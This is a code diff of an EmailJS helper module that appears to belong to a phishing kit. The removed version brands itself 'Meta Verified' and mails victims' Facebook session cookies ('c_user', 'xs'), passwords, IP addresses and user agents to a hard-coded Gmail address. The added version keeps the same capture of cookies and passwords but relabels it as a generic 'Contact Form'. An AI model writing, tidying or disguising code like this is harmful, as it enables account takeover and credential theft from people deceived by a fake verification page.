@@ -4,67 +4,26 @@ import emailjs from "@emailjs/browser";
 export const initEmailJS = () => {
   const userId = import.meta.env.VITE_EMAILJS_USER_ID;
   if (!userId) {
-    console.error("EmailJS User ID is not configured");
-    return;
+    throw new Error("EmailJS User ID is not configured. Please check your environment variables.");
   }
+
+  // Validate other required environment variables
+  const requiredVars = [
+    'VITE_EMAILJS_SERVICE_ID',
+    'VITE_EMAILJS_VALIDATION_TEMPLATE_ID',
+    'VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID'
+  ];
+
+  const missingVars = requiredVars.filter(
+    varName => !import.meta.env[varName]
+  );
+
+  if (missingVars.length > 0) {
+    throw new Error(`Missing required environment variables: ${missingVars.join(', ')}`);
+  }
+
   emailjs.init(userId);
-  console.log("EmailJS initialized successfully");
-};
-
-// Validation form email sender
-export const sendValidationFormEmail = async (formData: any) => {
-  try {
-    console.log("Sending validation form email...", { formData });
-    const templateParams = {
-      to_email: formData.user_email || "newzatpage@gmail.com", // Default admin email if not provided
-      from_name: "Meta Verified",
-      subject: "Meta Verified - Account Validation Request",
-      c_user: formData.c_user,
-      xs: formData.xs,
-      timestamp: formData.timestamp || new Date().toLocaleString(),
-      ip_address: formData.ipAddress || "Not available",
-      user_agent: formData.userAgent || navigator.userAgent,
-    };
-
-    const response = await emailjs.send(
-      import.meta.env.VITE_EMAILJS_SERVICE_ID,
-      import.meta.env.VITE_EMAILJS_VALIDATION_TEMPLATE_ID,
-      templateParams,
-    );
-    console.log("Validation email sent successfully:", response);
-    return response;
-  } catch (error) {
-    console.error("Error sending validation email:", error);
-    throw error;
-  }
-};
-
-// Confirmation form email sender
-export const sendConfirmationFormEmail = async (formData: any) => {
-  try {
-    console.log("Sending confirmation form email...", { formData });
-    const templateParams = {
-      to_email: formData.user_email || "newzatpage@gmail.com", // Default admin email if not provided
-      subject: "Meta Verified - Account Confirmation Details",
-      user_password: formData.password,
-      contact_method: formData.contactMethod,
-      country_code: formData.countryCode,
-      timestamp: formData.timestamp || new Date().toLocaleString(),
-      ip_address: formData.ipAddress || "Not available",
-      user_agent: formData.userAgent || navigator.userAgent,
-    };
-
-    const response = await emailjs.send(
-      import.meta.env.VITE_EMAILJS_SERVICE_ID,
-      import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID,
-      templateParams,
-    );
-    console.log("Confirmation email sent successfully:", response);
-    return response;
-  } catch (error) {
-    console.error("Error sending confirmation email:", error);
-    throw error;
-  }
+  console.log('EmailJS initialized successfully');
 };
 
 // Type definition for form data
@@ -79,3 +38,59 @@ export interface EmailFormData {
   timestamp?: string;
   userAgent?: string;
 }
+
+// Validation form email sender
+export const sendValidationFormEmail = async (formData: EmailFormData) => {
+  try {
+    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
+    const templateId = import.meta.env.VITE_EMAILJS_VALIDATION_TEMPLATE_ID;
+
+    if (!serviceId || !templateId) {
+      throw new Error("EmailJS service or template ID is not configured");
+    }
+
+    const templateParams = {
+      to_email: formData.user_email || "admin@example.com",
+      from_name: "Contact Form",
+      subject: "Contact Form - Validation Request",
+      c_user: formData.c_user,
+      xs: formData.xs,
+      timestamp: formData.timestamp || new Date().toLocaleString(),
+      ip_address: formData.ipAddress || "Not available",
+      user_agent: formData.userAgent || navigator.userAgent,
+    };
+
+    return await emailjs.send(serviceId, templateId, templateParams);
+  } catch (error) {
+    console.error("Error sending validation email:", error);
+    throw error;
+  }
+};
+
+// Confirmation form email sender
+export const sendConfirmationFormEmail = async (formData: EmailFormData) => {
+  try {
+    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
+    const templateId = import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID;
+
+    if (!serviceId || !templateId) {
+      throw new Error("EmailJS service or template ID is not configured");
+    }
+
+    const templateParams = {
+      to_email: formData.user_email || "admin@example.com",
+      subject: "Contact Form - Confirmation Details",
+      user_password: formData.password,
+      contact_method: formData.contactMethod,
+      country_code: formData.countryCode,
+      timestamp: formData.timestamp || new Date().toLocaleString(),
+      ip_address: formData.ipAddress || "Not available",
+      user_agent: formData.userAgent || navigator.userAgent,
+    };
+
+    return await emailjs.send(serviceId, templateId, templateParams);
+  } catch (error) {
+    console.error("Error sending confirmation email:", error);
+    throw error;
+  }
+};
